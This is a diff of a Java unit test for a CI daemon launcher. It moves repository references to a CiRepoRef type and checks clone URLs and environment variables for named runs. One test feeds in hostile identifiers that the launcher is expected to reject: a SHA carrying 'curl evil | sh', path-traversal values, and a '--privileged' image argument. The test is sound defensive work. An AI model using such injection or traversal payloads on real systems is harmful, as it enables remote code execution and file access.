@@ -1,5 +1,6 @@
 package eu.wohlben.qits.ci.daemonhost;
 
+import eu.wohlben.qits.ci.control.CiRepoRef;
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertNotEquals;
@@ -78,7 +79,7 @@ public class CiDaemonLauncherTest {
       new LaunchSpec(
           "0123456789abcdef-run",
           2,
-          "repo-1",
+          CiRepoRef.of("repo-1"),
           "main",
           "cafebabe",
           "maven:3.9",
@@ -99,7 +100,7 @@ public class CiDaemonLauncherTest {
     return new LaunchSpec(
         original.runId(),
         original.stepIndex(),
-        original.repoId(),
+        original.repo(),
         original.branch(),
         original.sha(),
         original.image(),
@@ -117,7 +118,7 @@ public class CiDaemonLauncherTest {
     return new LaunchSpec(
         spec.runId(),
         spec.stepIndex(),
-        spec.repoId(),
+        spec.repo(),
         spec.branch(),
         spec.sha(),
         spec.image(),
@@ -143,6 +144,10 @@ public class CiDaemonLauncherTest {
     env.put("QITS_CI_BRANCH", "main");
     env.put("QITS_CI_SHA", "cafebabe");
     env.put("QITS_CI_REPO_ID", "repo-1");
+    // The public coordinate, EMPTY rather than absent on an id-addressed run: one shape for a step
+    // to read, whichever way its run was announced.
+    env.put("QITS_CI_PROJECT_ID", "");
+    env.put("QITS_CI_REPO_NAME", "");
     env.put("CI", "true");
     env.put("QITS_CI", "true");
     env.put("QITS_REGISTRY", "qits-artifacts:8080");
@@ -186,6 +191,35 @@ public class CiDaemonLauncherTest {
             Policy.ephemeral(2040L),
             Recreate.never),
         launcher().buildWorkloadSpec(spec));
+  }
+
+  @Test
+  public void aNamedRunClonesByProjectAndNameAndSaysSoInTheEnvironment() {
+    // The post-cutover arm. Three values move together: the clone url becomes the public address,
+    // and the two new variables carry the pair a pipeline reads. QITS_CI_REPO_ID keeps announcing
+    // the STORAGE id — every pipeline in the estate still reads it, and a later work package is
+    // what moves them off it.
+    LaunchSpec named =
+        new LaunchSpec(
+            spec.runId(),
+            spec.stepIndex(),
+            CiRepoRef.of("2f1c9b3e-4a5b-6c7d-8e9f-0a1b2c3d4e5f", "qits", "qits-blobstore"),
+            spec.branch(),
+            spec.sha(),
+            spec.image(),
+            spec.daemonId(),
+            spec.secret(),
+            spec.daemonBinaryUrl(),
+            spec.stepTimeoutSeconds(),
+            spec.docker(),
+            spec.user(),
+            spec.env());
+
+    Map<String, String> env = launcher().buildWorkloadSpec(named).spec().env();
+    assertEquals("http://qits-githost:8080/git/qits/qits-blobstore", env.get("QITS_CI_REPOSITORY_URL"));
+    assertEquals("qits", env.get("QITS_CI_PROJECT_ID"));
+    assertEquals("qits-blobstore", env.get("QITS_CI_REPO_NAME"));
+    assertEquals("2f1c9b3e-4a5b-6c7d-8e9f-0a1b2c3d4e5f", env.get("QITS_CI_REPO_ID"));
   }
 
   @Test
@@ -449,7 +483,7 @@ public class CiDaemonLauncherTest {
         new LaunchSpec(
             spec.runId(),
             spec.stepIndex(),
-            spec.repoId(),
+            spec.repo(),
             spec.branch(),
             spec.sha(),
             spec.image(),
@@ -483,7 +517,7 @@ public class CiDaemonLauncherTest {
         new LaunchSpec(
             spec.runId(),
             spec.stepIndex(),
-            spec.repoId(),
+            spec.repo(),
             spec.branch(),
             spec.sha(),
             spec.image(),
@@ -584,10 +618,16 @@ public class CiDaemonLauncherTest {
    */
   @Test
   public void theCloneUrlEndsAtTheServiceAndCiAppendsTheGitSegment() {
-    assertEquals("http://qits-githost:8080/git/repo-1", launcher().cloneUrl("repo-1"));
+    assertEquals(
+        "http://qits-githost:8080/git/repo-1", launcher().cloneUrl(CiRepoRef.of("repo-1")));
     assertEquals(
         "http://a-host-of-any-depth/below/git/repo-1",
-        launcher("http://a-host-of-any-depth/below").cloneUrl("repo-1"));
+        launcher("http://a-host-of-any-depth/below").cloneUrl(CiRepoRef.of("repo-1")));
+    // And the public form, which is what a named run clones from: the project and the name, never
+    // the storage id — after the cutover that id is not an address a step container may use at all.
+    assertEquals(
+        "http://qits-githost:8080/git/qits/qits-blobstore",
+        launcher().cloneUrl(CiRepoRef.of("2f1c9b3e-4a5b-6c7d-8e9f-0a1b2c3d4e5f", "qits", "qits-blobstore")));
   }
 
   /**
@@ -601,22 +641,22 @@ public class CiDaemonLauncherTest {
   public void hostileIdentifiersAreRejectedBeforeAnyCallIsMade() {
     CiDaemonLauncher launcher = launcher();
     LaunchSpec injectedSha =
-        new LaunchSpec("run", 0, "repo-1", "main", "x\"; curl evil | sh #", "img", "d", "s", "u", 0, false, "", Map.of());
+        new LaunchSpec("run", 0, CiRepoRef.of("repo-1"), "main", "x\"; curl evil | sh #", "img", "d", "s", "u", 0, false, "", Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(injectedSha));
     LaunchSpec traversal =
-        new LaunchSpec("run", 0, "../../etc", "main", "cafebabe", "img", "d", "s", "u", 0, false, "", Map.of());
+        new LaunchSpec("run", 0, CiRepoRef.of("../../etc"), "main", "cafebabe", "img", "d", "s", "u", 0, false, "", Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(traversal));
     LaunchSpec injectedBranch =
-        new LaunchSpec("run", 0, "repo-1", "main/../..", "cafebabe", "img", "d", "s", "u", 0, false, "", Map.of());
+        new LaunchSpec("run", 0, CiRepoRef.of("repo-1"), "main/../..", "cafebabe", "img", "d", "s", "u", 0, false, "", Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(injectedBranch));
     // The image is repo-declared rather than intake-supplied, and it still reaches a docker argv on
     // the far side of the wire. Nothing is known to get through it, but an argument that can be read
     // as an option is not a thing to leave to another service's good manners.
     LaunchSpec optionShapedImage =
-        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "--privileged", "d", "s", "u", 0, false, "", Map.of());
+        new LaunchSpec("run", 0, CiRepoRef.of("repo-1"), "main", "cafebabe", "--privileged", "d", "s", "u", 0, false, "", Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(optionShapedImage));
     LaunchSpec blankImage =
-        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "  ", "d", "s", "u", 0, false, "", Map.of());
+        new LaunchSpec("run", 0, CiRepoRef.of("repo-1"), "main", "cafebabe", "  ", "d", "s", "u", 0, false, "", Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(blankImage));
   }
 
